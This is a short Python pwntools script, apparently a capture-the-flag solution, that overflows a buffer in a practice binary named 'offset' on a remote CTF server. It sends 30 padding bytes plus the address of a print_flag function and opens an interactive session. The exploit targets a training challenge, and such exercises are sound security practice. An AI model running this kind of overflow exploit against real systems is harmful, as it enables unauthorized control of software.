#!/usr/bin/python 
from pwn import * 

#p = process("./offset") 
p = remote("ctf.j0n9hyun.xyz", 3007) 
elf = ELF("./offset") 
print_flag = elf.symbols['print_flag'] 

pay = 'A'*30 + p32(print_flag) 
p.sendline(pay) 

p.interactive()

